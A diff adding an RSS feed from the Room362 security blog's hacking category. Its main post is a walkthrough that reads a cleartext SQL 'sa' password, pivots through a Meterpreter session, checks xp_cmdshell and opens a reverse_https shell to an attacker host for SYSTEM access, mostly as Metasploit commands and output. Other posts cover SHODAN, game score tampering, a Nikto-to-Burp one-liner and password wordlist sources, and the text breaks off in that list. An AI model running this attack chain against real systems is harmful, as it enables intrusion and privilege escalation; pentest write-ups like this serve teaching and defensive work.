@@ -1,0 +1,1007 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hacking on Room362</title>
+    <link>http://localhost:1313/categories/hacking/</link>
+    <description>Recent content in Hacking on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Fri, 07 May 2010 14:05:53 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/categories/hacking/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>0Exploit Privilege Escalation</title>
+      <link>http://localhost:1313/post/2010/2010570exploit-privilege-escalation-html/</link>
+      <pubDate>Fri, 07 May 2010 14:05:53 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010570exploit-privilege-escalation-html/</guid>
+      <description>&lt;p&gt;The other day &lt;a href=&#34;http://carnal0wange.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; posted an &lt;a href=&#34;http://carnal0wnage.attackresearch.com/node/417&#34;&gt;excellent blog post&lt;/a&gt; about the WebDAV hotness that &lt;a href=&#34;http://twitter.com/chrissullo&#34;&gt;Chris Sullo&lt;/a&gt; (author of &lt;a href=&#34;http://cirt.net/Nikto2&#34;&gt;Nikto&lt;/a&gt;) cooked up (&lt;a href=&#34;http://security.sunera.com/2010/04/davtest-quickly-test-exploit-webdav.html&#34;&gt;DAVTest&lt;/a&gt;) which &lt;a href=&#34;http://twitter.com/sussurro&#34;&gt;Ryan Linn&lt;/a&gt; popped out a &lt;a href=&#34;http://trac.happypacket.net/browser/msfmods/trunk/modules/auxiliary/scanner/http/webdav_test.rb&#34;&gt;Metasploit module&lt;/a&gt; for.&lt;/p&gt;
+
+&lt;p&gt;Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; getuid&lt;/p&gt;
+
+&lt;p&gt;Server username: &lt;strong&gt;NT AUTHORITYNETWORK SERVICE&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Lets look around a bit..&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; pwd&lt;/p&gt;
+
+&lt;p&gt;C:Inetpubwwwroot&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; ls&lt;/p&gt;
+
+&lt;p&gt;Listing: C:Inetpubwwwroot&lt;/p&gt;
+
+&lt;p&gt;===========================&lt;/p&gt;
+
+&lt;p&gt;Mode  Size  Type  Last modified  Name&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Fri May 07 09:32:19 -0400 2010  .&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:51:48 -0400 2010  ..&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  admin&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1587  fil  Sat Dec 08 23:01:24 -0500 2001  default.asp&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1465  fil  Sat Dec 08 23:01:24 -0500 2001  default.css&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  3295  fil  Thu Jan 03 12:40:48 -0500 2002  forgotpass.asp&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  images&lt;/p&gt;
+
+&lt;p&gt;40777/rwxrwxrwx  0  dir  Mon May 03 12:12:57 -0400 2010  language&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  1802  fil  Thu Jan 24 12:10:04 -0500 2002  logoff.asp&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  7785  fil  Sat Jun 15 19:49:20 -0400 2002  logon.asp&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;100666/rw-rw-rw-  1801  fil  Mon May 03 12:42:45 -0400 2010  settings.asp&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;100666/rw-rw-rw-  21137  fil  Wed Aug 28 11:31:42 -0400 2002  setup.asp&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sweet! a &amp;ldquo;settings.asp&amp;rdquo;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; cat settings.asp&lt;/p&gt;
+
+&lt;p&gt;&lt;SCRIPT LANGUAGE = &#34;VBScript&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;SQLUser = &amp;ldquo;sa&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;SQLPass = &amp;ldquo;SuperDuper#@rdP@$$w0rd2012&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(/editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;/SCRIPT&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem.&lt;/p&gt;
+
+&lt;p&gt;Pivoting to the rescue:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Background session 1? [y/N]&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; route add 192.168.56.0 255.255.255.0 1&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; route print&lt;/p&gt;
+
+&lt;p&gt;Active Routing Table&lt;/p&gt;
+
+&lt;p&gt;====================&lt;/p&gt;
+
+&lt;p&gt;Subnet  Netmask  Gateway&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;192.168.56.0  255.255.255.0  Session 1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren&amp;rsquo;t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf exploit(handler) &amp;gt; use scanner/mssql/mssql_login&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set BLANK_PASSWORDS false&lt;/p&gt;
+
+&lt;p&gt;BLANK_PASSWORDS =&amp;gt; false&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; set RHOSTS 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOSTS =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_login) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1433 - MSSQL - Trying username:&amp;lsquo;sa&amp;rsquo; with password:&amp;lsquo;SuperDuper#@rdP@$$w0rd2012&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;[+] 192.168.56.3:1433 - &lt;strong&gt;MSSQL - successful login &amp;lsquo;sa&amp;rsquo; : &amp;lsquo;SuperDuper#@rdP@$$w0rd2012&amp;rsquo;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Scanned 1 of 1 hosts (100% complete)&lt;/p&gt;
+
+&lt;p&gt;[*] Auxiliary module execution completed&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for):&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf exploit(mssql_login) &amp;gt; use admin/mssql/mssql_enum&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;smsf auxiliary(mssql_enum) &amp;gt; set RHOST 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOST =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; run&lt;/p&gt;
+
+&lt;p&gt;[*] Running MS SQL Server Enumeration&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Version:&lt;/p&gt;
+
+&lt;p&gt;[*] Microsoft SQL Server  2000 - 8.00.194 (Intel X86)&lt;/p&gt;
+
+&lt;p&gt;[*] Aug  6 2000 00:57:48&lt;/p&gt;
+
+&lt;p&gt;[*] Copyright &amp;copy; 1988-2000 Microsoft Corporation&lt;/p&gt;
+
+&lt;p&gt;[*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[*] **&lt;/strong&gt; **&lt;strong&gt;xp_cmdshell is Enabled&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(/editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Instances found on this server:&lt;/p&gt;
+
+&lt;p&gt;[*]  MSSQLSERVER&lt;/p&gt;
+
+&lt;p&gt;[*] Default Server Instance SQL Server Service is running under the privilege of:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;[*] **&lt;/strong&gt; **&lt;strong&gt;LocalSystem&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Auxiliary module execution completed&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;XP_CMDSHELL and the server runs as local system. Looking good, payload time.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;msf auxiliary(mssql_enum) &amp;gt; use windows/mssql/mssql_payload&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set PAYLOAD windows/meterpreter/reverse_https&lt;/p&gt;
+
+&lt;p&gt;PAYLOAD =&amp;gt; windows/meterpreter/reverse_https&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set LHOST 10.10.10.59&lt;/p&gt;
+
+&lt;p&gt;LHOST =&amp;gt; 10.10.10.59&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set RHOST 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;RHOST =&amp;gt; 192.168.56.3&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set LPORT 443&lt;/p&gt;
+
+&lt;p&gt;LPORT =&amp;gt; 443&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; set PASSWORD SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;PASSWORD =&amp;gt; SuperDuper#@rdP@$$w0rd2012&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; exploit&lt;/p&gt;
+
+&lt;p&gt;[*] HTTPS listener started on &lt;a href=&#34;https://10.10.10.59:443/&#34;&gt;https://10.10.10.59:443/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 2.78% done (&lt;sup&gt;1494&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 5.57% done (&lt;sup&gt;2988&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 8.35% done (&lt;sup&gt;4482&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;&amp;lt;(editorial snip)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 94.64% done (&lt;sup&gt;50796&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] Command Stager progress - 97.32% done (&lt;sup&gt;52235&lt;/sup&gt;&amp;frasl;&lt;sub&gt;53675&lt;/sub&gt; bytes)&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1061 Request received for /AvlbV&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1061 Staging connection for target vlbV received&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Patching Target ID vlbV into DLL&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1062 Request received for /BvlbV&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] 192.168.56.3:1062 Stage connection for target vlbV received&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Meterpreter session 2 opened (10.10.10.59:443 -&amp;gt; 192.168.56.3:1062) at Thu May 06 22:03:50 -0400 2010&lt;/p&gt;
+
+&lt;p&gt;[*] Exploit completed, but no session was created.&lt;/p&gt;
+
+&lt;p&gt;msf exploit(mssql_payload) &amp;gt; sessions -i 2&lt;/p&gt;
+
+&lt;p&gt;[*] Starting interaction with 2&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; getuid&lt;/p&gt;
+
+&lt;p&gt;Server username: &lt;strong&gt;NT AUTHORITYSYSTEM&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Game over..&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note: Routing only sends the module(be it exploit or aux) through the session. Once the payload runs (for exploit modules), it&amp;rsquo;s is calling straight back to the LHOST (Attacker box), not through the session. So, in this example you can now exit session 1 (NETWORK SERVICE) as it&amp;rsquo;s not really needed any more.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;br /&gt;
+**&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>SHODAN The Computer Search</title>
+      <link>http://localhost:1313/post/2009/20091124shodan-the-computer-search-html/</link>
+      <pubDate>Tue, 24 Nov 2009 14:21:41 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/20091124shodan-the-computer-search-html/</guid>
+      <description>&lt;p&gt;If you haven&amp;rsquo;t seen it all over twitter yet, &lt;a href=&#34;http://twitter.com/achillean&#34;&gt;achillean&lt;/a&gt; released the &amp;ldquo;beta&amp;rdquo; of &lt;a href=&#34;http://shodan.surtri.com/&#34;&gt;SHODAN&lt;/a&gt; yesterday. It&amp;rsquo;s a search engine of basically a nmap of the internet (ports 21, 22, 23 or 80 so far).&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://shodan.surtri.com/&#34;&gt;http://shodan.surtri.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can search by keyword, and/or using any of the advanced search options.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;country:2-letter country code&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;hostname:full or partial host name&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;net:IP range using CIDR notation (ex: 18.7.7.0/24 )&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;port:21, 22, 23 or 80&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Here is just a taste of the power this bring to the game:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2009/11/shodan_oracle.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let your mind run wild. I imagine this search engine will do nothing but grow. Remember, as with any service, your searches are happening on someone else&amp;rsquo;s servers, be gentle (it&amp;rsquo;s free.. right now) and be wary, you don&amp;rsquo;t want to put too much data about a customer ;-)&lt;/p&gt;
+
+&lt;p&gt;Thanks go to &lt;a href=&#34;http://www.twitter.com/hdmoore&#34;&gt;HD Moore&lt;/a&gt; for the head up about the service, and &lt;a href=&#34;http://www.twitter.com/thierryzoller&#34;&gt;Thierry Zoller&lt;/a&gt; for adding flame to the fire of crazy searches to try on this new service.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Hacking Crazy Taxi</title>
+      <link>http://localhost:1313/post/2009/20091017hacking-crazy-taxi-html/</link>
+      <pubDate>Sat, 17 Oct 2009 15:36:52 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/20091017hacking-crazy-taxi-html/</guid>
+      <description>&lt;p&gt;I had a bet with my friend about getting #1 on the Crazy Taxi high score page (== motivation for this post).&lt;/p&gt;
+
+&lt;p&gt;For those who have not been introduced to it yet, it&amp;rsquo;s a Facebook/Flash/2.0 resurrection of a much older game.&lt;/p&gt;
+
+&lt;p&gt;Not having extreme timing skills, I quickly gave up on getting the 2,000,000 points required to make it the &amp;ldquo;normal&amp;rdquo; way: My first try was modifying the outgoing HTTP traffic using the Tamper Data plugin for Firefox (to catch the obvious ones). The Crazy Taxi Flash does actually submit your score using HTTP in clear text (IIRC they have a reflected XSS there as well), but the GET-param is only used for displaying a score - nothing is saved. By the looks of things, they seem to be RC4-encrypting the score as some sort of weak client-side anti-tamper protection, and even though singling out the request that submitted the score was no pain at a all - it actually said &amp;ldquo;submitScore&amp;rdquo; - decompiling the Flash, however, was.&lt;/p&gt;
+
+&lt;p&gt;At first I tried with flasm, but for some reason flasm went all bananas when confronted with the Crazy Taxi flash files, so I started sketching up a Flash / AS3 deobfuscator / decompiler with &lt;a href=&#34;http://frigolit.net&#34;&gt;Frigolit&lt;/a&gt; - and then I realized that simply debugging the host process would be far the fastest way to do it. I started out with setting my score to &amp;ldquo;6661337&amp;rdquo;, but someone had &amp;ldquo;beat&amp;rdquo; it the day after. I wanted to be on top, and I didn&amp;rsquo;t want to have to &amp;ldquo;maintain&amp;rdquo; my position. I wanted the maximum score, so that made me look into matters and discover that the score was stored in a signed double (I think they use PHP ;).&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s a video of me &amp;ldquo;achieving&amp;rdquo; 0x7fff ffff points. A nice little thing is that if you go above 0x7ffff ffff (&amp;gt;=0x8000 0000), the sign will flip and your numbers will &amp;ldquo;shrink&amp;rdquo; instead of growing. Damn I would like to see the frustrated faces of all them other script kiddies when they sit at home, trying to raise their scores and getting minus values instead :-)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://vimeo.com/7105034&#34;&gt;Hacking Crazy Taxi&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/pragmatk&#34;&gt;Joe Pragmatk&lt;/a&gt; on &lt;a href=&#34;http://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Burp Tip of the Day - Nikto db import</title>
+      <link>http://localhost:1313/post/2009/20091010burp-tip-of-the-day-nikto-db-import-html/</link>
+      <pubDate>Sat, 10 Oct 2009 12:31:10 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/20091010burp-tip-of-the-day-nikto-db-import-html/</guid>
+      <description>&lt;p&gt;CKTricky over at &lt;a href=&#34;http://cktricky.blogspot.com&#34;&gt;http://cktricky.blogspot.com&lt;/a&gt; has been running an awesome Burp Tip of the Day series on his blog. After seeing him use &lt;a href=&#34;http://cktricky.blogspot.com/2009/09/btod-nikto-thru-burp-masking-nikto.html&#34;&gt;Nikto through Burp&lt;/a&gt;. I decided to see if I could just export the list of checks to a text file so that I could use them over and over in Intruder. After a bit of awk and sed hell I figured it out, and submited it to him for acceptance to his BTotD series. Yesterday it was posted ;-)&lt;/p&gt;
+
+&lt;p&gt;Here: &lt;a href=&#34;http://cktricky.blogspot.com/2009/10/btod-importing-nikto-db-to-intruder.html&#34;&gt;http://cktricky.blogspot.com/2009/10/btod-importing-nikto-db-to-intruder.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the ugly command I came up with:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;cat /pentest/web/nikto/plugins/db_tests | awk -F &amp;ldquo;,&amp;rdquo; &amp;lsquo;{print $4}&amp;rsquo; | sed &amp;rsquo;s/^&amp;rdquo;*//;s/&amp;ldquo;$//&amp;rsquo; | sed &amp;rsquo;s/^@CGIDIRS//;s/@ADMIN//;s/^@NUKE//;s/^@POSTNUKE//;s/^@PHPMYADMIN//&amp;rsquo; | sed &amp;rsquo;s/^///&amp;rsquo; &amp;gt; ~/nikto_burp.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;What you are sacrificing here are the checks for the CGIDIRS, ADMIN, NUKE, POSTNUKE, and PHPMYADMIN interfaces. Personally, I&amp;rsquo;ve modified this script a bit, but you can modify it how best fits your tests:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;cat /pentest/web/nikto/plugins/db_tests | awk -F &amp;ldquo;,&amp;rdquo; &amp;lsquo;{print $4}&amp;rsquo; | sed &amp;rsquo;s/^&amp;rdquo;*//;s/&amp;ldquo;$//&amp;rsquo; | sed &amp;rsquo;s/^@CGIDIRS/cgi-bin//;s/@ADMIN//;s/^@NUKE//;s/^@POSTNUKE//;s/^@PHPMYADMIN/phpMyAdmin//&amp;rsquo; | sed &amp;rsquo;s/^///&amp;rsquo; &amp;gt; ~/nikto_burp.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So that I could cover at least the most common cgi and phpmyadmin directories&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
+      <link>http://localhost:1313/post/2009/2009102packet-captures-with-meterpreter-7zip-windump-and-nmap-ish-html/</link>
+      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009102packet-captures-with-meterpreter-7zip-windump-and-nmap-ish-html/</guid>
+      <description>&lt;p&gt;So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://vimeo.com/6830384&#34;&gt;Metasploit meterpreter Windump/Winpcap sniffer&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/siles&#34;&gt;siles&lt;/a&gt; on &lt;a href=&#34;http://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Password / Word lists</title>
+      <link>http://localhost:1313/post/2009/2009918password-word-lists-html/</link>
+      <pubDate>Fri, 18 Sep 2009 14:41:16 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009918password-word-lists-html/</guid>
+      <description>&lt;p&gt;Brute force, even though it&amp;rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&amp;rsquo;s were word lists come in handy. It&amp;rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&amp;rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.&lt;/p&gt;
+
+&lt;p&gt;Matt Weir and company created a cool tool that has the best of both worlds, Dictionary based Rainbow Tables with Dr-Crack, which you can find here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://reusablesec.googlepages.com/drcrack&#34;&gt;http://reusablesec.googlepages.com/drcrack&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;But, back to the reason of this post, word lists. Where do you get them? Here are a couple of my favorite places in no particular order:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://www.packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;http://www.theargon.com/achilles/wordlists/&#34;&gt;http://www.theargon.com/achilles/wordlists/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;http://www.openwall.com/wordlists/&#34;&gt;http://www.openwall.com/wordlists/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I like to keep 3 size word lists:&lt;br /&gt;
+1. small and fast: usually based on the output of one of the tools i&amp;rsquo;m about to tell you about&lt;br /&gt;
+2. medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I&amp;rsquo;m pretty picky about what goes into this list&lt;br /&gt;
+3. huge: any wordlist I come across gets added to this list, it gets sorted and uniqued and restored&lt;/p&gt;
+
+&lt;p&gt;Now the two tools that I like for the small list is are CeWL and wyd&lt;/p&gt;
+
+&lt;p&gt;CeWL - &lt;a href=&#34;http://www.digininja.org/projects/cewl.php&#34;&gt;http://www.digininja.org/projects/cewl.php&lt;/a&gt;&lt;br /&gt;
+Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http://www.remote-exploit.org/codes_wyd.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;They have some very similar lists of features, your mileage may vary. But they basically parse files and web pages for words and generate password lists based on the words found.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-02-11 08:01 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;Korelogic&amp;rsquo;s password lists: &lt;a href=&#34;http://contest.korelogic.com/wordlists.html&#34;&gt;http://contest.korelogic.com/wordlists.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Korelogic&amp;rsquo;s John rule set: &lt;a href=&#34;http://contest.korelogic.com/rules.html&#34;&gt;http://contest.korelogic.com/rules.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 05:00 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;I missed one hell of a treasure trove of word lists:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://trac.kismac-ng.org/wiki/wordlists&#34;&gt;http://trac.kismac-ng.org/wiki/wordlists&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Right now, there list is this:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;OpenWall:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&#34;&gt;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;ftp://ftp.openwall.com/pub/wordlists/&#34;&gt;ftp://ftp.openwall.com/pub/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/mirrors/&#34;&gt;http://www.openwall.com/mirrors/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://passwordz.info/&#34;&gt;http://passwordz.info/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;ftp://ftp.ox.ac.uk/pub/wordlists/&#34;&gt;ftp://ftp.ox.ac.uk/pub/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://gdataonline.com/downloads/GDict/&#34;&gt;http://gdataonline.com/downloads/GDict/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/&#34;&gt;http://theargon.com/achilles/wordlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/theargonlists/&#34;&gt;http://theargon.com/achilles/wordlists/theargonlists/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;ftp://ftp.cerias.purdue.edu/pub/dict/&#34;&gt;ftp://ftp.cerias.purdue.edu/pub/dict/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.securinfos.info/wordlists_dictionnaires.php&#34;&gt;http://www.securinfos.info/wordlists_dictionnaires.php&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
